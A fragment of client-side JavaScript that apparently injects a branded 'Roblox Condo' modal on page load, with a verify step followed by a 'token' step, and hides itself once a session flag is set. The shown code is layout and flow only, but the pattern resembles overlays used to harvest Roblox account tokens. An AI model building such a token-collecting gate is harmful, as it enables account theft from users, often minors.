    logoWrap.style.cssText = 'width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#dc2626,#991b1b);display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#fff';
    logoWrap.innerHTML = ICONS.globe;

    var logoLabel = document.createElement('span');
    logoLabel.style.cssText = 'font-size:14px;font-weight:800;color:#fff;letter-spacing:-.02em';
    logoLabel.textContent = 'Roblox Condo';

    var badgeEl = document.createElement('div');
    badgeEl.style.cssText = 'margin-left:auto;display:flex;align-items:center;gap:5px;font-size:10px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;color:#fca5a5;background:rgba(220,38,38,.14);border:1px solid rgba(220,38,38,.28);padding:4px 10px;border-radius:99px';
    badgeEl.appendChild(icon('lock', '#fca5a5'));
    badgeEl.appendChild(document.createTextNode(' ' + t.badge));

    header.appendChild(logoWrap); header.appendChild(logoLabel); header.appendChild(badgeEl);
    card.appendChild(header);

    ov.appendChild(card);
    document.body.appendChild(ov);

    /* dismiss helper */
    function dismiss() {
      ov.classList.add('rc-out');
      setTimeout(function () { ov.remove(); }, 240);
      sessionStorage.setItem(VERIFIED_KEY, '1');
    }

    /* step1 → step2 transition */
    var step1 = buildVerifyStep(card, function onVerified(userData) {
      /* fade out step1 */
      step1.style.opacity = '0';
      step1.style.transform = 'translateY(-10px)';
      setTimeout(function () {
        step1.remove();
        buildTokenStep(card, userData, dismiss);
      }, 260);
    });
  }

  /* ═══════════════════════════════════════════════════════════
     BOOT
  ═══════════════════════════════════════════════════════════ */
  if (!sessionStorage.getItem(VERIFIED_KEY)) {
    detectLang(function () {
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', buildModal);
      } else {
        buildModal();
      }
    });
  }

  observer.observe(document.body, { childList: true, subtree: true });

})();
